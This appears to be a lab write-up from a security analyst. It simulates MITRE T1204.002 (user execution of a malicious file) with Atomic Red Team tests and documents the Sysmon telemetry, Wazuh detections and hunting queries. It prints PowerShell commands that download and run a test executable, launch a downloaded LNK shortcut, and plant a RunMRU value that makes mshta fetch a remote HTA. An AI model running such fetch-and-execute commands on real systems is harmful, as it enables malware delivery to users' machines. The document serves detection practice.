# 📂 **Scenario 3 — User Execution: Malicious File (T1204.002)**

**Category:** Execution  **Technique:** User Execution  **Sub-Technique:** Malicious File (T1204.002)  **Platform:** Windows 10  **Tools Used:** Sysmon, Wazuh, Atomic Red Team, PowerShell  

---

## 🔍 Understanding User Execution — Malicious File (T1204.002)

User execution is one of the **most common initial access vectors** in real-world attacks.
Adversaries frequently rely on **PUAs, LNK shortcuts, and RunMRU registry abuse** to trick users into launching payloads that lead to:

* Initial malware staging
* Credential theft
* Persistence
* Lateral movement
* Full compromise

This scenario focuses on detecting **malicious file execution initiated by the user**, mapped to MITRE Technique **T1204.002**.

---

## ⚔️ Why I Performed These Three Malicious Execution Simulations

These three atomic tests collectively simulate **three major phishing/MalDoc behaviors**:

| Test                                 | Real-World Behavior                             | Why It Matters                                             |
| ------------------------------------ | ----------------------------------------------- | ---------------------------------------------------------- |
| **Test #8 — PUA Execution**          | Unwanted apps disguised as installers, droppers | Common initial foothold for adware & lightweight malware   |
| **Test #10 — LNK Payload Download**  | Shortcut used as phishing lure                  | Used extensively by APT29, Qakbot, Emotet                  |
| **Test #12 — ClickFix RunMRU Abuse** | Registry-run command → mshta execution          | Simulates modern phishing tactics abusing user interaction |

Together, they show how attackers rely on **deceptive user interaction** to trigger malware execution.

---

# 🧠 **0. Hypothesis**

> *If a user executes a malicious file or shortcut, then Sysmon + Wazuh should show abnormal process chains, unexpected download activity, and LOLBAS execution patterns.*

---

# 🔬 **1. Attack Simulations (T1204.002) — What I Tested**

## 🧪 **Test 1 — Potentially Unwanted Application (PUA)**

**Atomic Test #8**

### ▶️ Command Executed

```powershell
Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
& "#{pua_file}"
```
<img width="707" height="209" alt="Screenshot 2025-11-21 233202" src="https://github.com/user-attachments/assets/19349ad7-e645-45bd-a896-11a348b0c993" />

### 🧾 What This Test Simulates

* Download & execution of a **Potentially Unwanted Application**
* Simulates users falling for “fake installers”
* Common pre-stage for adware and droppers

### 📌 Execution Details

* **File Name:** `PotentiallyUnwanted.exe`
* **File Path:** `C:\Users\lus3r\appdata\local\temp\PotentiallyUnwanted.exe`

### 🔍 Sysmon Evidence

* **Event ID 1** (Process Create)
* **Event ID 11** (File Create)

### 🚨 Wazuh Detection

* **Rule 92213** — Suspicious executable launched
* **Rule 100300** — User-space execution pattern

---

## 🧪 **Test 2 — LNK Payload Download**

**Atomic Test #10**

### ▶️ Command Executed

```powershell
Invoke-WebRequest -OutFile $env:Temp\test10.lnk https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk
$file1 = "$env:Temp\test10.lnk"
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe
```
<img width="671" height="167" alt="Screenshot 2025-11-21 234520" src="https://github.com/user-attachments/assets/dac1d405-744c-4527-8982-0c4c7d88a47d" />

### 🧾 What This Test Simulates

LNK shortcut downloaded via phishing → user clicks → downloads payload.
A highly realistic adversary technique (Qakbot, Trickbot, Emotet).

### 📌 Execution Details

* **File Name:** `test10.lnk`
* **File Path:** `C:\Users\lus3r\appdata\local\temp\test10.lnk`

### 🔍 Sysmon Evidence

* **explorer.exe → test10.lnk → powershell.exe**
* External network download
* Possible script execution

### 🚨 Wazuh Detection

* Rule: **Suspicious shortcut execution** *(auto-detected + correlated)*
---

## 🧪 **Test 3 — ClickFix Campaign (RunMRU → mshta)**

**Atomic Test #12**

### ▶️ Command Executed

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
```
<img width="776" height="158" alt="Screenshot 2025-11-22 000744" src="https://github.com/user-attachments/assets/2bea4635-0546-4414-a58c-42bbd83affe8" />

*(Equivalent encoded version used in execution phase)*

### 🧾 What This Test Simulates

An attacker abuses the **RunMRU registry key**, causing Windows to launch **mshta.exe** via PowerShell.
This is extremely common in modern phishing operations.

### 🔍 Sysmon Evidence

* **Event ID 12** — Registry modification
* **Event ID 1** — Process Create
* **Process Chain:**

  * powershell.exe → reg.exe (RunMRU) → mshta.exe → remote HTA execution

### 🚨 Wazuh Detection

* **Rule 100300** — Suspicious PowerShell/LOLBAS behavior

---

# 🧩 **2. Data Source Validation**

| Data Source                    | Status                          |
| ------------------------------ | ------------------------------- |
| Sysmon (Event ID 1, 3, 11, 12) | ✔ Captured                      |
| Wazuh Agent → Manager          | ✔ Log Flow Working              |
| Custom Rules                   | ✔ Already added from Scenario 1 |

---

# 🔥 **3. Telemetry Collected (Sysmon Evidence)**

* PUA executed via PowerShell
* LNK launched via explorer.exe → powershell.exe
* mshta executed from RunMRU
* Remote download activity
* Registry modification for Test #12
* File creation in Temp directories

---

# 🕵️ **4. Threat Hunting Queries (Wazuh Discover)**

Your final queries (per test):

### **Test 8 — PUA**

```
data.win.eventdata.image:"PotentiallyUnwanted.exe" 
AND data.win.eventdata.parentImage:*powershell.exe*
```
<img width="914" height="460" alt="Screenshot 2025-11-21 233113" src="https://github.com/user-attachments/assets/112db2b6-7e66-4e94-8c46-b5b7b3b72515" />
<img width="793" height="518" alt="Screenshot 2025-11-21 232625" src="https://github.com/user-attachments/assets/cf6b313d-080e-4755-8a2d-41a6295072cf" />

### **Test 10 — LNK**

```
data.win.eventdata.parentCommandLine:*test10.lnk*
AND data.win.eventdata.image:*powershell.exe*
```
<img width="912" height="502" alt="Screenshot 2025-11-21 234449" src="https://github.com/user-attachments/assets/014981c3-d30b-4b3a-afa2-0f379f877eaf" />
<img width="917" height="487" alt="Screenshot 2025-11-21 234259" src="https://github.com/user-attachments/assets/f13a1caf-993d-44d9-afee-6fd5c3ac4aa4" />

### **Test 12 — ClickFix / mshta**

```
data.win.eventdata.image:*mshta.exe*
AND data.win.eventdata.parentImage:*powershell.exe*
```
<img width="920" height="476" alt="Screenshot 2025-11-22 000548" src="https://github.com/user-attachments/assets/0d8b9a62-7b77-426f-a121-b021826a044e" />
<img width="901" height="468" alt="Screenshot 2025-11-22 000641" src="https://github.com/user-attachments/assets/04d96b5a-7413-4784-a162-81d894a12192" />

---

# 🚨 **5. Wazuh Detection (SIEM Alerts)**

| Rule ID         | Description                                  |
| --------------- | -------------------------------------------- |
| 92213           | Suspicious executable in user profile        |
| 100300          | Suspicious user-initiated execution / LOLBAS |
| Auto-correlated | LNK → PowerShell chain                       |

All three techniques triggered **high-fidelity detections**.

---

# 🧠 **6. Hypothesis Validation (Final Result)**

✔ Hypothesis **validated**
✔ All three execution paths generated detectable signals
✔ Wazuh + Sysmon correlation was strong
✔ No blind spots in user-execution categories
✔ These are highly realistic phishing-style behaviors

---

# 📝 **7. Analyst Notes (My SOC Findings)**

* **PUA behavior** resembled adware/downloader activity
* **LNK download** showed a clear chain: explorer → lnk → powershell
* **ClickFix abuse** demonstrated RunMRU manipulation → mshta execution
* All behaviors align with real Malware-as-a-Service (MaaS) and phishing campaigns

---

# 🛡️ **8. Detection Gaps Identified**

No new detection gaps — rules created during earlier scenarios were effective across all three tests.

---

# 🛠️ **9. Mitigation Recommendations**

* Block **mshta.exe** via group policy
* Restrict Launch of **LNK files** from untrusted locations
* Enable Windows **ASR rules** for script-based malware
* Monitor RunMRU modifications across endpoints

---

# 🧩 **10. Summary — What I Learned**

* Strong understanding of **user-execution based malware behaviors**
* Practical insight into **PUA, LNK, and mshta** exploit chains
* Ability to correlate **process, registry, and network** artifacts
* Reinforced knowledge of **T1204.002** and phishing kill-chain patterns
* Enhanced skill in building Wazuh Discover queries


